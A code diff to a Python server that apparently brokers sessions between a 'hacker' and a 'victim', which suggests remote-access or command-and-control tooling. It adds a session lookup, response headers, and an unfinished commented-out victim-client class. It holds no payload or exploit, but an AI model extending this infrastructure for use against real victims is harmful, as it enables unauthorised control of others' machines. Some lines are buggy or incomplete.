@@ -236,6 +236,14 @@ class Sessions:
         del self._session_communications[session_id]
         del self._sessions[session_id]
 
+    def get_session(self, session_id: str):
+        """Get the session i.e the hacker and victim inside it using the session_id."""
+        # First check if the session is up and running
+        if not self.check_session_active(session_id):
+            raise KeyError("The specified could not be found.")
+
+        return self._sessions[session_id]
+
     def check_session_active(self, session_id: str):
         """Check if the given session exists and is active."""
         return True if self._sessions.get(session_id, None) is not None else False
@@ -253,10 +261,48 @@ class HandlerResponse:
         successful: bool,
         res_code: HTTPStatus,
         body: Optional[bytes] = None,
+        headers: dict[str, str] = {},
     ):
         self.successful = successful
         self.res_code = res_code
         self.body = body
+        self.headers = headers
+
+
+# class Client:
+#     """The client, i.e victim, server and probably Admin.
+#     Make sure to check the validity of the headers before passing it to the client."""
+
+#     def __init__(self, headers: HTTPMessage, database_handler: Database):
+#         # ---- Making the arguments we get instance wide
+#         self.headers = headers
+#         self.db_handler = database_handler
+
+#         # ---- Setting the client's properties
+#         self.client_type = self.get_client_type()
+
+#     def get_client_type(self):
+#         """Get the client type from the headers and database."""
+#         # This property must exist if it doesn't then we're in trouble
+#         # I said it must exist because we should have already checked the
+#         # authenticity of the request before passing the header to the client.
+#         client_id = self.headers["client-id"]
+
+#         # Check if the user is already in the database
+#         client_type = self.db_handler.query("SELECT client_type FROM clients WHERE client_id=?", (client_id,))
+
+#         if client_type is None:
+#             # Some error occurred so let's report it to the user
+#             raise Exception(f"SQL execution failure while getting the client type of client '{client_id}'")
+
+#         if len(client_type) == 0:
+#             # No client existed with this ID so this must be a new one.
+
+
+#         else:
+#             # The client exists in the database so we'll use that to verify
+#             # the authenticity of the request
+#             pass
 
 
 class LiveSessionData:
@@ -436,6 +482,9 @@ class Config:
                 "Invalid session file. Please use server generated session files.",
                 ec.invalid_file,
             )
+
+        return ({}, Path())  # Just for the type checks, specially Pylance.
+        # It failed to recognize that the program quits if the js.JSONDecodeError happens
 
 
 def get_argument_parser():
